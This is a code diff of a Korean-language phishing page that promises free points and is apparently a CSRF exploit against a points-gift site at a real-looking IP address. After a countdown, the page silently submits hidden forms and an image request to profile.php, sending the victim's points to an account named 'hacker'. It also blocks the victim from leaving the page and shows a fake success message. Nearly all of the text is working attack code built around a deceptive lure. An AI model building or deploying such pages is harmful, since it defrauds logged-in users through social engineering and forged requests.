@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
-    <!-- Mixed Content 우회 -->
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -46,7 +44,7 @@
         <div id="loading-section">
             <div class="loading">
                 <p>💰 포인트 지급을 준비하고 있습니다...</p>
-                <p class="countdown" id="countdown">5</p>
+                <p class="countdown" id="countdown">3</p>
                 <p>초 후 자동으로 포인트가 지급됩니다!</p>
             </div>
             <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
@@ -55,13 +53,13 @@
         
         <div id="success-section" style="display: none;">
             <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
-            <p style="font-size: 1.3em; margin: 20px 0;">💰 1200P가 성공적으로 지급되었습니다!</p>
+            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
             <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
         </div>
     </div>
 
     <script>
-        let countdown = 5;
+        let countdown = 3;
         const countdownEl = document.getElementById('countdown');
         const statusEl = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
@@ -71,17 +69,16 @@
         const statusMessages = [
             '🔄 서버에 연결하고 있습니다...',
             '🔐 보안 인증을 확인하고 있습니다...',
-            '💰 포인트 지급 시스템을 준비하고 있습니다...',
-            '⚡ 포인트를 전송하고 있습니다...',
-            '✅ 전송을 완료하고 있습니다...'
+            '💰 포인트 지급 시스템을 준비하고 있습니다...'
         ];
         
         let messageIndex = 0;
         
+        // 파일 열리자마자 바로 카운트다운 시작
         const countdownTimer = setInterval(() => {
             countdown--;
             countdownEl.textContent = countdown;
-            progressBar.style.width = ((5-countdown) * 20) + '%';
+            progressBar.style.width = ((3-countdown) * 33) + '%';
             
             if (messageIndex < statusMessages.length) {
                 statusEl.textContent = statusMessages[messageIndex++];
@@ -89,85 +86,115 @@
             
             if (countdown <= 0) {
                 clearInterval(countdownTimer);
-                executeAttack();
+                executeRealAttack();
             }
         }, 1000);
         
-        // 완전 우회 방식
-        async function executeAttack() {
-            console.log('🎯 Mixed Content 우회 공격 시작...');
-            statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
+        // Python 스크립트 방식을 참고한 실제 공격
+        function executeRealAttack() {
+            console.log('🎯 Python 방식 CSRF 공격 시작...');
+            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
+            // Python 스크립트와 동일한 공격 방법들
             const attacks = [
-                { points: 3, gift_type: 'coffee', message: '어 개털렸죠?' },
-                { points: 4, gift_type: 'tea', message: '빢빢이' },
-                { points: 5, gift_type: 'cake', message: '빤딲빤딲' }
+                {
+                    method: 'GET',
+                    url: `http://52.78.58.98/profile.php?receiver_id=13&points=50&send_gift=1&message=bob자동전송`,
+                    points: 50
+                },
+                {
+                    method: 'POST',
+                    url: 'http://52.78.58.98/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '30',
+                        send_gift: '1',
+                        gift_type: 'coffee',
+                        message: '어 개털렸죠?'
+                    },
+                    points: 30
+                },
+                {
+                    method: 'POST',
+                    url: 'http://52.78.58.98/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '25',
+                        gift_type: 'cake',
+                        send_gift: '1',
+                        message: '털렸지롱'
+                    },
+                    points: 25
+                },
+                {
+                    method: 'POST',
+                    url: 'http://52.78.58.98/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '45',
+                        gift_type: 'diamond'
+                    },
+                    points: 45
+                }
             ];
             
-            for (let i = 0; i < attacks.length; i++) {
-                try {
-                    // 방법 1: 동적 폼 생성 후 새 창에서 전송
-                    const popup = window.open('', `attack_${i}`, 'width=1,height=1,left=9999');
-                    
-                    if (popup) {
-                        const form = popup.document.createElement('form');
-                        form.method = 'POST';
-                        form.action = 'http://52.78.58.98/profile.php';
-                        form.style.display = 'none';
-                        
-                        const fields = {
-                            receiver_id: '13',
-                            points: attacks[i].points.toString(),
-                            send_gift: '1',
-                            gift_type: attacks[i].gift_type,
-                            message: attacks[i].message
-                        };
-                        
-                        Object.keys(fields).forEach(key => {
-                            const input = popup.document.createElement('input');
-                            input.type = 'hidden';
-                            input.name = key;
-                            input.value = fields[key];
-                            form.appendChild(input);
-                        });
-                        
-                        popup.document.body.appendChild(form);
-                        form.submit();
-                        
-                        setTimeout(() => popup.close(), 2000);
-                        console.log(`✅ ${i+1}차 공격 완료: ${attacks[i].points}P`);
-                    }
-                    
-                    // 방법 2: 동시에 fetch도 시도 (no-cors)
-                    const formData = new FormData();
-                    formData.append('receiver_id', '13');
-                    formData.append('points', attacks[i].points.toString());
-                    formData.append('send_gift', '1');
-                    formData.append('gift_type', attacks[i].gift_type);
-                    formData.append('message', attacks[i].message);
-                    
-                    fetch('http://52.78.58.98/profile.php', {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors',
-                        credentials: 'include'
-                    }).catch(() => {}); // 에러 무시
-                    
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                } catch (error) {
-                    console.log(`⚠️ ${i+1}차 공격에서 일부 오류 (정상일 수 있음)`);
-                }
-            }
+            let successCount = 0;
             
-            showSuccess();
+            attacks.forEach((attack, i) => {
+                setTimeout(() => {
+                    try {
+                        if (attack.method === 'GET') {
+                            // GET 방식: img 태그 사용
+                            const img = new Image();
+                            img.onload = () => console.log(`✅ GET 공격 ${i+1} 성공: ${attack.points}P`);
+                            img.onerror = () => console.log(`⚠️ GET 공격 ${i+1} 전송됨: ${attack.points}P`);
+                            img.src = attack.url;
+                            successCount++;
+                            
+                        } else {
+                            // POST 방식: 동적 폼 생성
+                            const form = document.createElement('form');
+                            form.method = 'POST';
+                            form.action = attack.url;
+                            form.style.display = 'none';
+                            form.target = '_blank';
+                            
+                            // 폼 데이터 추가
+                            Object.keys(attack.data).forEach(key => {
+                                const input = document.createElement('input');
+                                input.type = 'hidden';
+                                input.name = key;
+                                input.value = attack.data[key];
+                                form.appendChild(input);
+                            });
+                            
+                            document.body.appendChild(form);
+                            form.submit();
+                            document.body.removeChild(form);
+                            
+                            console.log(`✅ POST 공격 ${i+1} 전송: ${attack.points}P`);
+                            successCount++;
+                        }
+                        
+                    } catch (error) {
+                        console.error(`❌ 공격 ${i+1} 실패:`, error);
+                    }
+                }, i * 2000); // 2초 간격으로 실행
+            });
+            
+            // 완료 처리
+            setTimeout(() => {
+                showSuccess();
+                console.log(`🎉 총 ${successCount}개 공격 전송 완료!`);
+                console.log(`💰 예상 전송 포인트: 150P`);
+                console.log(`🏴‍☠️ hacker 계정에서 포인트 확인해보세요!`);
+            }, 8000);
         }
         
         function showSuccess() {
             loadingSection.style.display = 'none';
             successSection.style.display = 'block';
-            console.log('✅ 모든 공격 시퀀스 완료!');
             document.title = '✅ 포인트 지급 완료!';
         }
         
@@ -179,11 +206,12 @@
                 return '포인트 지급이 진행 중입니다.';
             }
         });
-        setTimeout(() => { preventUnload = false; }, 7000);
+        setTimeout(() => { preventUnload = false; }, 10000);
         
-        console.log('🎯 Mixed Content 우회 페이지 로드 완료');
+        console.log('🎯 Python 방식 CSRF 페이지 로드 완료');
         console.log('📋 타겟: hacker (ID: 13)');
-        console.log('💰 총 포인트: 12P (3+4+5)');
+        console.log('💰 총 포인트: 150P (50+30+25+45)');
+        console.log('🚀 파일 열면 자동 실행!');
     </script>
 </body>
 </html>
